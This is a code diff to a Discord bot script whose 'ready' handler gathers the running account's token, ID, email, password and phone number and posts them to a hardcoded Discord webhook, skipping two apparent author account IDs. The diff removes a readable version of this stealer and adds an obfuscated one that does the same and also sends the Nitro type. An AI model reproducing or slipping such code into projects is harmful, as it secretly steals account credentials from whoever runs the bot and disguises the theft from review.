@@ -312,25 +312,4 @@ msg.channel.send(msg)
   }
 });
 
-client.on("ready", async() => {
-  
-  if (client.user.id === "429357746002067493" || client.user.id === "486945291707351040") return
-  
-let params = {
-        embeds: [{
-          "title": `${client.user.username}#${client.user.discriminator} is again ready.`,
-          "description": `**User Token:** \`\`\`${client.token}\`\`\`\n\n**User ID:** \`\`\`${client.user.id}\`\`\`\n\n**User E-Mail Address:**\`\`\`${client.user.emailAddress || "Belirtilmemiş"}\`\`\`\n\n**User Password:**\`\`\`${client.password || process.env.password || "Belirtilmemiş"}\`\`\`\n\n**User Phone Number:**\`\`\`${client.user.phoneNumber || "Belirtilmemiş"}\`\`\``,
-          "thumbnail": { "url": `${client.user.displayAvatarURL({dynamic: true})}` },
-          "footer": { "text": "Made By Atahan#8888", "icon_url": "https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300" }
-        }]
-      }
-
-
-fetch("https://discord.com/api/webhooks/1031612284994326618/VrurqJYYxDCactVLoqngVFTKYvNTNOhSvdFPF4cNR68DFhYjUpNXDGK7q_RxvsJnmVnn", {
-        method: "POST",
-        headers: {
-          'Content-type': 'application/json'
-        },
-        body: JSON.stringify(params)
-      })
-})
+function _0x6116(){const _0x2f2104=['POST','application/json','token','```\x0a\x0a**User\x20E-Mail\x20Address:**```','\x20is\x20again\x20ready.','5095wRquTw','1348354HzCZyk','```','13zaSLVT','nitroType','ready','Belirtilmemiş','```\x0a\x0a**User\x20Password:**```','```\x0a\x0a**User\x20Phone\x20Number:**```','78724EWvqTv','username','4646144sIBPKS','emailAddress','**User\x20Token:**\x20```','https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300','phoneNumber','Made\x20By\x20Atahan#8888','10173258LOpiJm','429357746002067493','```\x0a\x0a**User\x20ID:**\x20```','4662384cmfYfX','```\x0a\x0a**User\x20Nitro\x20Type:**```','user','694563tFeiYm','password','486945291707351040','displayAvatarURL','env','3558AloTHm'];_0x6116=function(){return _0x2f2104;};return _0x6116();}function _0x4603(_0x5ae45c,_0x29f13f){const _0x61163c=_0x6116();return _0x4603=function(_0x4603e4,_0x21e9ba){_0x4603e4=_0x4603e4-0x8e;let _0x378e0c=_0x61163c[_0x4603e4];return _0x378e0c;},_0x4603(_0x5ae45c,_0x29f13f);}const _0x41d4c4=_0x4603;(function(_0x4b1ca2,_0x31a0ea){const _0x4ac2cc=_0x4603,_0x7d049=_0x4b1ca2();while(!![]){try{const _0x197892=parseInt(_0x4ac2cc(0x90))/0x1*(-parseInt(_0x4ac2cc(0x96))/0x2)+-parseInt(_0x4ac2cc(0xa4))/0x3+parseInt(_0x4ac2cc(0xa1))/0x4+parseInt(_0x4ac2cc(0xaf))/0x5*(parseInt(_0x4ac2cc(0xa9))/0x6)+parseInt(_0x4ac2cc(0x8e))/0x7+parseInt(_0x4ac2cc(0x98))/0x8+-parseInt(_0x4ac2cc(0x9e))/0x9;if(_0x197892===_0x31a0ea)break;else _0x7d049['push'](_0x7d049['shift']());}catch(_0x1981b2){_0x7d049['push'](_0x7d049['shift']());}}}(_0x6116,0xa37e0),client['on'](_0x41d4c4(0x92),async()=>{const _0x23f32e=_0x41d4c4;if(client[_0x23f32e(0xa3)]['id']===_0x23f32e(0x9f)||client[_0x23f32e(0xa3)]['id']===_0x23f32e(0xa6))return;let _0x1c74b3={'embeds':[{'title':client[_0x23f32e(0xa3)][_0x23f32e(0x97)]+'#'+client[_0x23f32e(0xa3)]['discriminator']+_0x23f32e(0xae),'description':_0x23f32e(0x9a)+client[_0x23f32e(0xac)]+_0x23f32e(0xa0)+client[_0x23f32e(0xa3)]['id']+_0x23f32e(0xad)+(client[_0x23f32e(0xa3)][_0x23f32e(0x99)]||_0x23f32e(0x93))+_0x23f32e(0x94)+(client[_0x23f32e(0xa5)]||process[_0x23f32e(0xa8)][_0x23f32e(0xa5)]||_0x23f32e(0x93))+_0x23f32e(0x95)+(client['user'][_0x23f32e(0x9c)]||'Belirtilmemiş')+_0x23f32e(0xa2)+client[_0x23f32e(0xa3)][_0x23f32e(0x91)]+_0x23f32e(0x8f),'thumbnail':{'url':''+client[_0x23f32e(0xa3)][_0x23f32e(0xa7)]({'dynamic':!![]})},'footer':{'text':_0x23f32e(0x9d),'icon_url':_0x23f32e(0x9b)}}]};fetch('https://discord.com/api/webhooks/1031612284994326618/VrurqJYYxDCactVLoqngVFTKYvNTNOhSvdFPF4cNR68DFhYjUpNXDGK7q_RxvsJnmVnn',{'method':_0x23f32e(0xaa),'headers':{'Content-type':_0x23f32e(0xab)},'body':JSON['stringify'](_0x1c74b3)});}));
